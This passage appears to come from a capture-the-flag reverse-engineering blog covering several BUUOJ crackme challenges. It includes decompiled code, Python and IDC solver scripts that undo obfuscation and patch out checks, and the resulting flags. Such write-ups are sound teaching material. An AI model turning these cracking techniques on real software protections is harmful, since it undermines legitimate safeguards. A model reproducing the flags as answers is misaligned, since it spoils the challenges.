do ++v3; while ( *((_BYTE *)Code + v3) ); v15 = 0i64; v30 = *v7; while ( *((_BYTE *)&amp;v30 + v15) ) &#123; if ( !*((_BYTE *)&amp;v30 + v15 + 1) ) &#123; ++v15; break; &#125; if ( !*((_BYTE *)&amp;v30 + v15 + 2) ) &#123; v15 += 2i64; break; &#125; if ( !*((_BYTE *)&amp;v30 + v15 + 3) ) &#123; v15 += 3i64; break; &#125; v15 += 4i64; if ( v15 &gt;= 0x10 ) break; &#125; for ( i = v15 + 1; i &lt; 0x10; ++i ) *((_BYTE *)&amp;v30 + i) = 0; v17 = (__int64)sub_140001AB0((__int64)Code, v3, (unsigned __int8 *)&amp;v30, &amp;Size); v18 = Size; v19 = (_BYTE *)v17; v20 = operator new(Size); v21 = 1; *v20 = v19[2]; v22 = v20 + 1; v20[1] = *v19; v20[2] = v19[3]; v20[3] = v19[1]; v20[4] = v19[6]; v20[5] = v19[4]; v20[6] = v19[7]; v20[7] = v19[5]; v20[8] = v19[10]; v20[9] = v19[8]; v20[10] = v19[11]; v20[11] = v19[9]; v20[12] = v19[14]; v20[13] = v19[12]; v20[14] = v19[15]; v20[15] = v19[13]; v20[16] = v19[18]; v20[17] = v19[16]; v20[18] = v19[19]; v20[19] = v19[17]; v20[20] = v19[22]; v20[21] = v19[20]; v20[22] = v19[23]; for ( v20[23] = v19[21]; v21 &lt; v18; ++v22 ) &#123; v23 = 0i64; if ( v21 / 3 &gt; 0 ) &#123; v24 = *v22; do &#123; v24 ^= v20[v23++]; *v22 = v24; &#125; while ( v23 &lt; v21 / 3 ); &#125; ++v21; &#125; *(_QWORD *)&amp;v30 = 0xC0953A7C6B40BCCEui64; v25 = v20 - (_BYTE *)&amp;v30; *((_QWORD *)&amp;v30 + 1) = 0x3502F79120209BEFi64; v26 = 0i64; v31 = 0xC8021823; v32 = 0xFA5656E7; do &#123; if ( *((_BYTE *)&amp;v30 + v26) != *((_BYTE *)&amp;v30 + v26 + v25) ) _exit(v8 * v8); ++v8; ++v26; &#125; while ( v26 &lt; 24 ); v27 = sub_140001620(std::cout, &quot;You win!&quot;); std::ostream::operator&lt;&lt;(v27, sub_1400017F0); return 0;&#125; IDA中使用插件FindCrypt可以看到程序使用了TEA加密 结合题目可以猜出是XXTEA加密 这题基本是看着别人的WP做出来的 1.text:0000000140001C4B global TEA_DELTA_140001C4B $c0 b&#39;\\xb9y7\\x9e&#39; 从上往下分析 用户输入字符串, 长度为19 前四个字符在字符集&quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot;中 取前四字节为密钥 加密结果乱序 迭代异或 校验加密结果 迭代异或的方式如下 1234567cipher[3] &#x3D; cipher[3] ^ cipher[0]cipher[4] &#x3D; cipher[4] ^ cipher[0]cipher[5] &#x3D; cipher[5] ^ cipher[0]cipher[6] &#x3D; cipher[6] ^ cipher[0] ^ cipher[1]cipher[7] &#x3D; cipher[7] ^ cipher[0] ^ cipher[1]cipher[8] &#x3D; cipher[8] ^ cipher[0] ^ cipher[1]... 密文如下(大端赋值, 之后需要转为小端的字符串) 1234*(_QWORD *)&amp;v30 &#x3D; 0xC0953A7C6B40BCCEui64;*((_QWORD *)&amp;v30 + 1) &#x3D; 0x3502F79120209BEFi64;v31 &#x3D; 0xC8021823;v32 &#x3D; 0xFA5656E7; 且这三个变量的内存分布如下 123__int128 v30; &#x2F;&#x2F; [rsp+28h] [rbp-40h] BYREFint v31; &#x2F;&#x2F; [rsp+38h] [rbp-30h]int v32; &#x2F;&#x2F; [rsp+3Ch] [rbp-2Ch] 所以四个数据的整体才是密文部分 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python3import binasciiimport xxteacipher = [0xC0953A7C6B40BCCE, 0x3502F79120209BEF, 0xC8021823, 0xFA5656E7]# 转小端字节串_byte = b&quot;&quot;for _ in cipher: _byte += binascii.unhexlify(hex(_)[2:].encode(&quot;ISO-8859-1&quot;))[::-1]# 迭代异或__byte = [_ for _ in _byte]for _ in range(len(__byte)-1, -1, -1): for __ in range(_//3): __byte[_] = __byte[_] ^ __byte[__]# 异或结果转为字节串___byte = &quot;&quot;for _ in __byte: ___byte += chr(_)___byte = ___byte.encode(&quot;ISO-8859-1&quot;)# 还原顺序seq_enc = [2, 0, 3, 1, 6, 4, 7, 5, 10, 8, 11, 9, 14, 12, 15, 13, 18, 16, 19, 17, 22, 20, 23, 21]seq_dec = [-1 for _ in seq_enc]for _ in range(len(seq_enc)): seq_dec[_] = seq_enc.index(_)____byte = b&quot;&quot;for _ in range(len(___byte)): ____byte += chr(___byte[seq_dec[_]]).encode(&quot;ISO-8859-1&quot;)# 解密key = &quot;flag&quot;flag = xxtea.decrypt(____byte, key).decode()print(flag) flag{CXX_and_++tea} findKey 链接: https://buuoj.cn/challenges#findKey EXE 32 一开始没找到主函数 1.rdata:00423028 aFlag db &#39;flag&#123;&#125;&#39;,0 ; DATA XREF: .text:00401A3A↑o 找到这样的一个字符串 搜索文本之后找到位置loc_401A37 但是这里并没有被定义成函数 粗略看下有一段疑似插入了花指令的代码 123456789101112.text:0040191D loc_40191D: ; CODE XREF: .text:0040193D↓j.text:0040191D push offset byte_428C54.text:00401922 call _strlen.text:00401927 add esp, 4.text:0040192A push eax.text:0040192B push offset byte_428C54.text:00401930 call sub_40101E.text:00401935 add esp, 0Ch.text:00401938 nop.text:00401939 jz short loc_401948.text:0040193B jnz short loc_401948.text:0040193D jmp short near ptr loc_40191D+2 根据我做的那些逆向题目的经验 按理说jz的前一条指令是能够对ZF产生影响的, 例如cmp, test 更奇怪的是后面跟了一条jnz和一条jmp 把这三条nop掉就可以定义为函数了 反编译后了下伪代码, 感觉差不多就是main函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // eax size_t v5; // eax DWORD v6; // eax HWND v7; // eax int v8; // eax int v9; // eax const CHAR *v10; // [esp+0h] [ebp-44Ch] const CHAR *v11; // [esp+4h] [ebp-448h] UINT v12; // [esp+8h] [ebp-444h] CHAR v13[256]; // [esp+54h] [ebp-3F8h] BYREF char v14[7]; // [esp+154h] [ebp-2F8h] BYREF __int16 v15; // [esp+15Bh] [ebp-2F1h] char v16; // [esp+15Dh] [ebp-2EFh] char Str[33]; // [esp+160h] [ebp-2ECh] BYREF char v18[220]; // [esp+181h] [ebp-2CBh] BYREF __int16 v19; // [esp+25Dh] [ebp-1EFh] char v20; // [esp+25Fh] [ebp-1EDh] CHAR v21[256]; // [esp+260h] [ebp-1ECh] BYREF CHAR String[4]; // [esp+360h] [ebp-ECh] BYREF int v23; // [esp+364h] [ebp-E8h] __int16 v24; // [esp+368h] [ebp-E4h] CHAR Text[32]; // [esp+36Ch] [ebp-E0h] BYREF struct tagRECT Rect; // [esp+38Ch] [ebp-C0h] BYREF CHAR Buffer[100]; // [esp+39Ch] [ebp-B0h] BYREF HDC hdc; // [esp+400h] [ebp-4Ch] struct tagPAINTSTRUCT Paint; // [esp+404h] [ebp-48h] BYREF int v30; // [esp+444h] [ebp-8h] int v31; // [esp+448h] [ebp-4h] LPARAM lParam; // [esp+460h] [ebp+14h] LoadStringA(hInstance, 0x6Au, Buffer, 0x64); if ( (unsigned int)argv &gt; 0x111 ) &#123; if ( argv == (const char **)517 ) &#123; if ( strlen((const char *)String1) &gt; 6 ) ExitProcess(0); if ( strlen((const char *)String1) ) &#123; memset(v21, 0, sizeof(v21)); v5 = strlen((const char *)String1); memcpy(v21, String1, v5); v6 = strlen((const char *)String1); v7 = (HWND)sub_40101E(String1, v6, (LPSTR)String1); MessageBoxA(v7, v10, v11, v12); strcpy(Str, &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;); memset(v18, 0, sizeof(v18)); v19 = 0; v20 = 0; strcpy(v14, &quot;SS&quot;); *(_DWORD *)&amp;v14[3] = 0; v15 = 0; v16 = 0; v8 = strlen(Str); sub_401005(v14, (int)Str, v8); if ( _strcmpi((const char *)String1, Str) ) &#123; SetWindowTextA((HWND)argc, &quot;flag&#123;&#125;&quot;); MessageBoxA((HWND)argc, &quot;Are you kidding me?&quot;, &quot;^_^&quot;, 0); ExitProcess(0); &#125; memcpy(v13, &amp;unk_423030, 0x32u); v9 = strlen(v13); sub_401005(v21, (int)v13, v9); MessageBoxA((HWND)argc, v13, 0, 0x32u); &#125; ++dword_428D54; &#125; else &#123; if ( argv != (const char **)520 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); if ( dword_428D54 == 16 ) &#123; strcpy(String, &quot;ctf&quot;); v23 = 0; v24 = 0; SetWindowTextA((HWND)argc, String); strcpy(Text, &quot;Are you kidding me?&quot;); MessageBoxA((HWND)argc, Text, Buffer, 0); &#125; ++dword_428D54; &#125; &#125; else if ( argv == (const char **)273 ) &#123; v31 = (unsigned __int16)envp; v30 = HIWORD(envp); if ( (unsigned __int16)envp == 104 ) &#123; DialogBoxParamA(hInstance, (LPCSTR)0x67, (HWND)argc, (DLGPROC)DialogFunc, 0); &#125; else &#123; if ( (unsigned __int16)envp != 105 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); DestroyWindow((HWND)argc); &#125; &#125; else if ( argv == (const char **)2 ) &#123; PostQuitMessage(0); &#125; else &#123; if ( argv != (const char **)15 ) return DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam); hdc = BeginPaint((HWND)argc, &amp;Paint); GetClientRect((HWND)argc, &amp;Rect); v4 = strlen(Buffer); DrawTextA(hdc, Buffer, v4, &amp;Rect, 1u); EndPaint((HWND)argc, &amp;Paint); &#125; return 0;&#125; 先跟进sub_40101E 1if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) ) 看到这句就知道是md5加密了 再跟进sub_401005 12345678910111213141516unsigned int __cdecl sub_401590(LPCSTR lpString, int a2, int a3)&#123; unsigned int result; // eax unsigned int i; // [esp+4Ch] [ebp-Ch] unsigned int v5; // [esp+54h] [ebp-4h] v5 = lstrlenA(lpString); for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; *(_BYTE *)(i + a2) ^= lpString[i % v5]; &#125; return result;&#125; 简单的异或 1sub_401005(v14, (int)Str, v8); v14 = &quot;SS&quot; Str = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot; v8 = 32 也就是说Str在异或之后与String1的md5结果比较 123456#!/usr/bin/env python3xor = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;dexor = &quot;&quot;for _ in xor: dexor += chr(ord(_) ^ ord(&quot;S&quot;))print(dexor) 得到c8837b23ff8aaa8a2dde915473ce0991 md5解密结果为123321 再跟进函数DialogFunc 123456789101112131415161718192021222324252627int __stdcall sub_401B20(HWND hDlg, int a2, int a3, int a4)&#123; switch ( a2 ) &#123; case 0x110: return 1; case 0x111: if ( (unsigned __int16)a3 != 1 &amp;&amp; (unsigned __int16)a3 != 2 ) goto LABEL_6; EndDialog(hDlg, (unsigned __int16)a3); return 1; case 0x202:LABEL_6: String1[dword_428C50++] = 49; return 0; case 0x205: String1[dword_428C50++] = 51; return 0; case 0x208: if ( dword_428D58 &lt; 3 ) ++dword_428D5C; String1[dword_428C50++] = 50; return 0; default: return 0; &#125;&#125; 这里的a2一开始没太懂 后来看了别人的wp才知道貌似是Windows Message 123#define WM_LBUTTONUP 0x0202#define WM_MBUTTONUP 0x0208#define WM_RBUTTONUP 0x0205 https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttonup https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-mbuttonup https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-rbuttonup 那么也就是按鼠标左键, 鼠标中键, 鼠标右键, 鼠标右键, 鼠标中键, 鼠标左键 值得一提的是, 调用函数DialogFunc代码 1DialogBoxParamA(hInstance, (LPCSTR)103, (HWND)argc, (DLGPROC)DialogFunc, 0); 在Resource Hacker中可以看到编号103对应着About对话框 也就是说需要在About对话框中按上述顺序点击鼠标 不是做这道题我都不会意识到我的鼠标中键已经报废了, 最后动调改String1的值 flag{n0_Zu0_n0_die} [FlareOn5]Minesweeper Championship Registration 链接: https://buuoj.cn/challenges#[FlareOn5]Minesweeper Championship Registration Java 1234567891011121314151617import javax.swing.JOptionPane;public class InviteValidator&#123; public static void main(String[] args) &#123; String response = JOptionPane.showInputDialog(null, &quot;Enter your invitation code:&quot;, &quot;Minesweeper Championship 2018&quot;, 3); if (response.equals(&quot;GoldenTicket2018@flare-on.com&quot;)) &#123; JOptionPane.showMessageDialog(null, &quot;Welcome to the Minesweeper Championship 2018!\\nPlease enter the following code to the ctfd.flare-on.com website to compete:\\n\\n&quot; + response, &quot;Success!&quot;, -1); &#125; else &#123; JOptionPane.showMessageDialog(null, &quot;Incorrect invitation code. Please try again next year.&quot;, &quot;Failure&quot;, 0); &#125; &#125;&#125; flag写脸上了 flag{GoldenTicket2018@flare-on.com} [网鼎杯 2020 青龙组]jocker 链接: https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]jocker EXE 32 主函数看到对函数进行异或就知道不对劲了 12345678910#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00401500; auto i; for (i = 0; i &lt;= 186; ++i) &#123; PatchByte(addr+i, Byte(addr+i)^0x41); &#125;&#125; 具体步骤参照这里 http://yoloyolo.top/2021/05/31/Reverse-3/#gwctf-2019re3 函数finally的前一部分也有被异或过, 需要重新定义为函数 函数main 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char Str[50]; // [esp+12h] [ebp-96h] BYREF char Destination[80]; // [esp+44h] [ebp-64h] BYREF DWORD flOldProtect; // [esp+94h] [ebp-14h] BYREF size_t v7; // [esp+98h] [ebp-10h] int v8; // [esp+9Ch] [ebp-Ch] __main(); puts(&quot;please input you flag:&quot;); if ( !VirtualProtect(encrypt, 0xC8u, 4u, &amp;flOldProtect) ) exit(1); scanf(&quot;%40s&quot;, Str); v7 = strlen(Str); if ( v7 != 24 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; strcpy(Destination, Str); wrong(Str); omg(Str); v8 = 0; if ( encrypt(Destination) ) finally(Destination); return 0;&#125; 跟进函数wrong 123456789101112131415char *__cdecl wrong(char *a1)&#123; char *result; // eax int i; // [esp+Ch] [ebp-4h] for ( i = 0; i &lt;= 23; ++i ) &#123; result = &amp;a1[i]; if ( (i &amp; 1) != 0 ) a1[i] -= i; else a1[i] ^= i; &#125; return result;&#125; 简单的加密 继续看函数omg 1234567891011121314151617181920int __cdecl omg(char *a1)&#123; int result; // eax int v2[24]; // [esp+18h] [ebp-80h] BYREF int i; // [esp+78h] [ebp-20h] int v4; // [esp+7Ch] [ebp-1Ch] v4 = 1; qmemcpy(v2, dword_4030C0, sizeof(v2)); for ( i = 0; i &lt;= 23; ++i ) &#123; if ( a1[i] != v2[i] ) v4 = 0; &#125; if ( v4 == 1 ) result = puts(&quot;hahahaha_do_you_find_me?&quot;); else result = puts(&quot;wrong ~~ But seems a little program&quot;); return result;&#125; 12345678910111213#!/usr/bin/env python3_4030C0 = [0x66, 0x6B, 0x63, 0x64, 0x7F, 0x61, 0x67, 0x64, 0x3B, 0x56, 0x6B, 0x61, 0x7B, 0x26, 0x3B, 0x50, 0x63, 0x5F, 0x4D, 0x5A, 0x71, 0x0C, 0x37, 0x66]flag = &quot;&quot;for _ in range(len(_4030C0)): if _ % 2 == 0: flag += chr(_4030C0[_] ^ _) else: flag += chr(_4030C0[_] + _)print(flag) 得到flag&#123;fak3_alw35_sp_me!!&#125; 然而是个假flag 继续看函数encrypt 1234567891011121314151617181920int __cdecl encrypt(char *a1)&#123; int v2[19]; // [esp+1Ch] [ebp-6Ch] BYREF int v3; // [esp+68h] [ebp-20h] int i; // [esp+6Ch] [ebp-1Ch] v3 = 1; qmemcpy(v2, dword_403040, sizeof(v2)); for ( i = 0; i &lt;= 18; ++i ) &#123; if ( (char)(a1[i] ^ Buffer[i]) != v2[i] ) &#123; puts(&quot;wrong ~&quot;); v3 = 0; exit(0); &#125; &#125; puts(&quot;come here&quot;); return v3;&#125; 12345678910#!/usr/bin/env python3flag = &quot;&quot;_buffer = &quot;hahahaha_do_you_find_me?&quot;_403040 = [0x0E, 0x0D, 0x09, 0x06, 0x13, 0x05, 0x58, 0x56, 0x3E, 0x06, 0x0C, 0x3C, 0x1F, 0x57, 0x14, 0x6B, 0x57, 0x59, 0x0D]for _ in range(len(_403040)): flag += chr(_403040[_] ^ ord(_buffer[_]))print(flag) 得到flag&#123;d07abccf8a410c 缺了五个字符 看函数finally 1234567891011121314151617int __cdecl finally(char *a1)&#123; unsigned int v1; // eax int result; // eax char v3[9]; // [esp+13h] [ebp-15h] BYREF int v4; // [esp+1Ch] [ebp-Ch] strcpy(v3, &quot;%tp&amp;:&quot;); v1 = time(0); srand(v1); v4 = rand() % 100; if ( (v3[*(_DWORD *)&amp;v3[5]] != a1[*(_DWORD *)&amp;v3[5]]) == v4 ) result = puts(&quot;Really??? Did you find it?OMG!!!&quot;); else result = puts(&quot;I hide the last part, you will not succeed!!!&quot;); return result;&#125; 看着有点发蒙, 感觉也没有在做什么正经的运算 v3的赋值算是给了一点点提示吧 奇奇怪怪的脑洞 12hex(ord(&quot;:&quot;)^ord(&#x27;&#125;&#x27;))&#x27;0x47&#x27; 1234567#!/usr/bin/env python3key = 0x47flag = &quot;flag&#123;d07abccf8a410c&quot;v3 = &quot;%tp&amp;:&quot;for _ in v3: flag += chr(ord(_) ^ key)print(flag) flag{d07abccf8a410cb37a} equation 链接: https://buuoj.cn/challenges#equation Javascript 看着这道题莫名地会想到“高明的黑客” 没啥好说的, 直接放代码 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3import reimport execjsraw = open(&quot;equation.html&quot;, &quot;r&quot;).read()data = re.findall(&quot;if\\((.*)\\)&quot;, raw)[0]data_list = data.split(&quot;&amp;&amp;&quot;)exp_sum = []res_sum = []for cnt in range(len(data_list)): test = data_list[cnt].split(&quot;==&quot;)[0] equ = data_list[cnt].split(&quot;==&quot;)[1] res = [int(execjs.eval(equ))] res_sum.append(res) symbol = [] if test.startswith(&quot;-&quot;): symbol.append(&quot;-&quot;) else: symbol.append(&quot;+&quot;) test = re.sub(&quot;\\]\\+l\\[&quot;, &quot; + &quot;, test) test = re.sub(&quot;\\]\\-l\\[&quot;, &quot; - &quot;, test) test = test.replace(&quot;l[&quot;, &quot;&quot;)[:-1] symbol_temp = re.findall(&quot; ([\\+\\-]) &quot;, test) for _ in symbol_temp: symbol.append(_) test = re.sub(&quot; [\\+\\-] &quot;, &quot; &quot;,test) jscode = test.split(&quot; &quot;) exp = [0 for _ in range(42)] for _ in range(len(jscode)): seq = int(execjs.eval(jscode[_])) if symbol[_] == &quot;+&quot;: exp[seq] = 1 elif symbol[_] == &quot;-&quot;: exp[seq] = -1 exp_sum.append(exp)b = Matrix(res_sum)x = Matrix(exp_sum)out = x.solve_right(b)flag = &quot;&quot;for _ in out: flag += chr(_[0])print(flag) execjs.eval()运行的速度好慢, 也懒得找能够代替这个函数的函数了 100次17s, 1638个字符串, 5分钟左右 [FlareOn5]Ultimate Minesweeper 链接: https://buuoj.cn/challenges#[FlareOn5]Ultimate Minesweeper .NET 先放IDA里看看 看到字符串&quot;Congratulations!&quot; 查看引用这个字符串的函数, 然后用dnspy看这些函数 MainForm::SquareRevealedCallback 12345678910111213141516171819202122// UltimateMinesweeper.MainForm// Token: 0x0600000C RID: 12 RVA: 0x00002348 File Offset: 0x00000548private void SquareRevealedCallback(uint column, uint row)&#123; if (this.MineField.BombRevealed) &#123; this.stopwatch.Stop(); Application.DoEvents(); Thread.Sleep(1000); new FailurePopup().ShowDialog(); Application.Exit(); &#125; this.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column); if (this.MineField.TotalUnrevealedEmptySquares == 0) &#123; this.stopwatch.Stop(); Application.DoEvents(); Thread.Sleep(1000); new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog(); Application.Exit(); &#125;&#125; 把判断失败的代码删掉再保存程序 找出三个点就能够进入过关的逻辑 但是flag的内容应该是与点击的格子相关 而且点的位置不是随机生成的 记下位置再玩一遍就能得到flag flag{Ch3aters_Alw4ys_W1n@flare-on.com} [2019红帽杯]childRE 链接: https://buuoj.cn/challenges#[2019红帽杯]childRE EXE 64 IDA中 main 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rax __int64 v4; // rax const CHAR *v5; // r11 __int64 v6; // r10 int v7; // er9 const CHAR *v8; // r10 __int64 v9; // rcx __int64 v10; // rax int result; // eax unsigned int v12; // ecx __int64 v13; // r9 __int128 v14[2]; // [rsp+20h] [rbp-38h] BYREF v14[0] = 0i64; v14[1] = 0i64; sub_140001080(&quot;%s&quot;); v3 = -1i64; do ++v3; while ( *((_BYTE *)v14 + v3) ); if ( v3 != 31 ) &#123; while ( 1 ) Sleep(0x3E8u); &#125; v4 = sub_140001280(v14); v5 = name; if ( v4 ) &#123; sub_1400015C0(*(_QWORD *)(v4 + 8)); sub_1400015C0(*(_QWORD *)(v6 + 16)); v7 = dword_1400057E0; v5[dword_1400057E0] = *v8; dword_1400057E0 = v7 + 1; &#125; UnDecorateSymbolName(v5, outputString, 0x100u, 0); v9 = -1i64; do ++v9; while ( outputString[v9] ); if ( v9 == 62 ) &#123; v12 = 0; v13 = 0i64; do &#123; if ( a1234567890Qwer[outputString[v13] % 23] != *(_BYTE *)(v13 + 0x140003478i64) ) _exit(v12); if ( a1234567890Qwer[outputString[v13] / 23] != *(_BYTE *)(v13 + 0x140003438i64) ) _exit(v12 * v12); ++v12; ++v13; &#125; while ( v12 &lt; 0x3E ); sub_140001020(&quot;flag&#123;MD5(your input)&#125;\\n&quot;); result = 0; &#125; else &#123; v10 = sub_1400018A0(std::cout); std::ostream::operator&lt;&lt;(v10, sub_140001A60); result = -1; &#125; return result;&#125; 0x140003478i64即 1.rdata:0000000140003478 a46200860044218 db &#39;(_@4620!08!6_0*0442!@186%%0@3&#x3D;66!!974*3234&#x3D;&amp;0^3&amp;1@&#x3D;&amp;0908!6_0*&amp;&#39;,0 先还原出outputString 123456789101112#!/usr/bin/env python3import hashlib_003478 = &quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;_003438 = &quot;55565653255552225565565555243466334653663544426565555525555222&quot;_0033A0 = &quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;output = [0 for _ in _003478]for _ in range(len(_003478)): b = _0033A0.index(_003478[_]) a = _0033A0.index(_003438[_]) output[_] = chr(23 * a + b)cipher = &quot;&quot;.join(output)print(cipher) 得到结果如下 1private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)Traceback (most recent call last) 然后是C++名字修饰 在一块实在没怎么了解过 https://www.freesion.com/article/6515734088/ 中间的函数貌似有替换字符串顺序 断点下到UnDecorateSymbolName(v5, outputString, 0x100u, 0);就能在寄存器看到替换顺序之后字符串 12345678910#!/usr/bin/env python3decorate = &quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;seq1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_&quot;seq2 = &quot;PQHRSIDTUJVWKEBXYLZ[MF\\\\]N^_OGCA&quot;cipher = [0 for _ in decorate]for _ in range(len(cipher)): cipher[_] = decorate[seq2.index(seq1[_])]print(&quot;&quot;.join(cipher))flag = &quot;flag&#123;&quot; + hashlib.md5(&quot;&quot;.join(cipher).encode()).hexdigest() + &quot;&#125;&quot;print(flag) flag{63b148e750fed3a33419168ac58083f5} [ACTF新生赛2020]SoulLike 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]SoulLike ELF 64 IDA中 main 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637383940__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 result; // rax char v5; // [rsp+7h] [rbp-B9h] int i; // [rsp+8h] [rbp-B8h] int j; // [rsp+Ch] [rbp-B4h] int v8[14]; // [rsp+10h] [rbp-B0h] BYREF char v9[110]; // [rsp+4Ah] [rbp-76h] BYREF unsigned __int64 v10; // [rsp+B8h] [rbp-8h] v10 = __readfsqword(0x28u); printf(&quot;input flag:&quot;); scanf(&quot;%s&quot;, &amp;v9[6]); strcpy(v9, &quot;actf&#123;&quot;); v5 = 1; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( v9[i] != v9[i + 6] ) &#123; v5 = 0; goto LABEL_6; &#125; &#125; if ( !v5 ) goto LABEL_16;LABEL_6: for ( j = 0; j &lt;= 11; ++j ) v8[j] = v9[j + 11]; if ( (unsigned __int8)sub_83A(v8) &amp;&amp; v9[23] == 125 ) &#123; printf(&quot;That&#x27;s true! flag is %s&quot;, &amp;v9[6]); result = 0LL; &#125; else &#123;LABEL_16: printf(&quot;Try another time...&quot;); result = 0LL; &#125; return result;&#125; 函数sub_83A代码过长 IDA无法反编译 需要修改文件hexrays.cfg 1MAX_FUNCSIZE &#x3D; 64 &#x2F;&#x2F; Functions over 64K are not decompiled 这个数值改大点就行 反编译了sub_83A就知道该干嘛了 12345678910111213141516#!/usr/bin/env python3import reimport osdata = open(&quot;data&quot;, &quot;r&quot;).read().replace(&quot; &quot;, &quot;&quot;).replace(&quot;u;&quot;, &quot;&quot;).replace(&quot;;&quot;, &quot;&quot;).replace(&quot;*a1&quot;, &quot;a1[0]&quot;)data = re.sub(&quot;\\+\\+(.*)&quot;, &quot;\\\\1 -= 1&quot;, data).split(&quot;\\n&quot;)write = open(&quot;data_re.py&quot;, &quot;w&quot;)write.write(&quot;a1 = [126, 50, 37, 88, 89, 107, 53, 110, 0, 19, 30, 56]\\n&quot;)for _ in data[::-1]: write.write(_+&quot;\\n&quot;)write.write(&quot;&quot;&quot;flag = &quot;flag&#123;&quot;for _ in a1: flag += chr(_)flag += &quot;&#125;&quot;print(flag)&quot;&quot;&quot;)write.close()os.system(&quot;python3 data_re.py&quot;) flag{b0Nf|Re_LiT!} [MRCTF2020]PixelShooter 链接: https://buuoj.cn/challenges#[MRCTF2020]PixelShooter Android 貌似是用了U3D, 改成zip解压, 找到Assembly-CSharp.dll 在IDA里看字符串就行 flag{Unity_1S_Fun_233} [安洵杯 2019]crackMe 链接: https://buuoj.cn/challenges#[安洵杯 2019]crackMe EXE 32 IDA中 _main_0 函数反编译结果如下 1234567891011int __cdecl __noreturn main_0(int argc, const char **argv, const char **envp)&#123; int (__cdecl *v3)(_DWORD *); // [esp-4h] [ebp-D0h] printf(&quot;please Input the flag:\\n&quot;); scanf_s(&quot;%s&quot;, &amp;unk_41A1E4); MessageBoxW(0, L&quot;Exception&quot;, L&quot;Warning&quot;, 0); v3 = sub_41100F; MEMORY[0] = 1; sub_411136(HIWORD(v3));&#125; 运行的时候回弹一个&quot;hooked&quot;的窗口 动调发现函数MessageBoxW被hook到了sub_412AB0 12345678910111213141516171819int __stdcall sub_412AB0(int a1, int a2, int a3, int a4)&#123; size_t i; // [esp+D8h] [ebp-8h] for ( i = 0; i &lt; j_strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 122 &amp;&amp; Str[i] &gt;= 97 ) &#123; Str[i] -= 32; &#125; else if ( Str[i] &lt;= 90 &amp;&amp; Str[i] &gt;= 65 ) &#123; Str[i] += 32; &#125; &#125; MessageBoxA(0, &quot;hooked&quot;, &quot;successed&quot;, 0); AddVectoredExceptionHandler(0, Handler); return 0;&#125; 做了一个VEH的异常处理 123456789101112int __stdcall Handler_0(_DWORD **a1)&#123; char v2[20]; // [esp+D0h] [ebp-18h] BYREF if ( **a1 == -1073741819 ) &#123; qmemcpy(v2, &quot;where_are_u_now?&quot;, 16); sub_411172(&amp;unk_41A218, v2); SetUnhandledExceptionFilter(TopLevelExceptionFilter); &#125; return 0;&#125; VEH异常处理又套了一个SEH异常处理 运行完函数sub_41100F之后 1mov dword ptr [eax], 1 这条语句会触发异常 从而进入VEH的异常处理函数 理一遍顺序 Base64表内容变换 函数sub_411172使用SM4加密输入内容(搜一下0xA3B1BAC6) Str2顺序变换 函数sub_4110FF变换Base64表顺序 Str2与Base64编码结果比较 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python3import base64import binasciiimport pysm4cipher = &quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;cipher_list = [0 for _ in cipher ]for _ in range(0, len(cipher_list), 2): # 换位 cipher_list[_] = cipher[_+1] cipher_list[_+1] = cipher[_]cipher = &quot;&quot;.join(cipher_list).replace(&quot;!&quot;, &quot;&quot;)base64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; base64_table_re = [0 for _ in base64_table]for _ in range(len(base64_table_re)): # 换Base64表 if 97 &lt;= ord(base64_table[(_+24)%64]) &lt;= 122: base64_table_re[_] = chr(ord(base64_table[(_+24)%64])-32) elif 65 &lt;= ord(base64_table[(_+24)%64]) &lt;= 90: base64_table_re[_] = chr(ord(base64_table[(_+24)%64])+32) else: base64_table_re[_] = base64_table[(_+24)%64]base64_table_re = &quot;&quot;.join(base64_table_re)cipher_list = [0 for _ in cipher]for _ in range(len(cipher)): # Base64换表解码 cipher_list[_] = base64_table[base64_table_re.index(cipher[_])]cipher = &quot;&quot;.join(cipher_list)cipher = 